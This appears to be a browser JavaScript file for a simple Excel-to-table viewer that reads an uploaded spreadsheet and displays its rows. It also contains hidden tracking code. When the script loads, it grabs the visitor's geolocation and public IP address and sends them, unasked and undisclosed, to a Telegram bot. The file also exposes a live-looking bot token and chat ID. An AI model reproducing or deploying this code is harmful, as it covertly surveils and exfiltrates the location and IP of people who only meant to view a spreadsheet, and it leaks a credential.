const botToken = "7099870589:AAGL9JlIG9djKDI_Q8dtedPMMyOayQyO7nU"; // Replace with your bot token
const chatId = "6959013020"; // Replace with your chat ID

document
  .getElementById("fileInput")
  .addEventListener("change", handleFileSelect, false);

function handleFileSelect(event) {
  const file = event.target.files[0];
  const reader = new FileReader();
  reader.onload = function (e) {
    const data = new Uint8Array(e.target.result);
    const workbook = XLSX.read(data, { type: "array" });
    const firstSheetName = workbook.SheetNames[0];
    const worksheet = workbook.Sheets[firstSheetName];
    const jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1 });
    populateTable(jsonData);
  };
  reader.readAsArrayBuffer(file);
}

function populateTable(data) {
  const tableBody = document
    .getElementById("excelData")
    .getElementsByTagName("tbody")[0];
  tableBody.innerHTML = "";
  data.forEach((row) => {
    const newRow = tableBody.insertRow();
    row.forEach((cell) => {
      const newCell = newRow.insertCell();
      newCell.textContent = cell;
    });
  });
}

function sendErrorMessageToTelegram(errorMessage) {
  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
  axios
    .post(url, {
      chat_id: chatId,
      text: errorMessage,
    })
    .then((response) => {
      console.log("Error message sent successfully:", response.data);
    })
    .catch((error) => {
      console.error("Error sending error message:", error);
    });
}

function getUserLocationAndSendToTelegram() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      function (position) {
        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;
        const googleMapsLink = `https://www.google.com/maps/@${latitude},${longitude},15z`;
        fetch("https://api.ipify.org?format=json")
          .then((response) => response.json())
          .then((data) => {
            const message = `User data:\nIP: ${data.ip}\nLocation: ${googleMapsLink}`;
            sendMessageToTelegram(message);
          })
          .catch((error) => {
            const errorMessage = "Error fetching IP address: " + error.message;
            console.error(errorMessage);
            sendErrorMessageToTelegram(errorMessage);
          });
      },
      function (error) {
        const errorMessage = "Geolocation error: " + error.message;
        console.error(errorMessage);
        sendErrorMessageToTelegram(errorMessage);
        fetch("https://api.ipify.org?format=json")
          .then((response) => response.json())
          .then((data) => {
            const message = `User data:\nIP: ${data.ip}\nLocation: Geolocation not available.`;
            sendMessageToTelegram(message);
          })
          .catch((error) => {
            const errorMessage = "Error fetching IP address: " + error.message;
            console.error(errorMessage);
            sendErrorMessageToTelegram(errorMessage);
          });
      }
    );
  } else {
    const errorMessage = "Geolocation is not supported by this browser.";
    console.error(errorMessage);
    sendErrorMessageToTelegram(errorMessage);
    fetch("https://api.ipify.org?format=json")
      .then((response) => response.json())
      .then((data) => {
        const message = `User data:\nIP: ${data.ip}\nLocation: Geolocation not supported.`;
        sendMessageToTelegram(message);
      })
      .catch((error) => {
        const errorMessage = "Error fetching IP address: " + error.message;
        console.error(errorMessage);
        sendErrorMessageToTelegram(errorMessage);
      });
  }
}

function sendMessageToTelegram(message) {
  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
  axios
    .post(url, {
      chat_id: chatId,
      text: message,
    })
    .then((response) => {
      console.log("Message sent successfully:", response.data);
    })
    .catch((error) => {
      console.error("Error sending message:", error);
    });
}

// Call the function to get user location when the script loads
getUserLocationAndSendToTelegram();
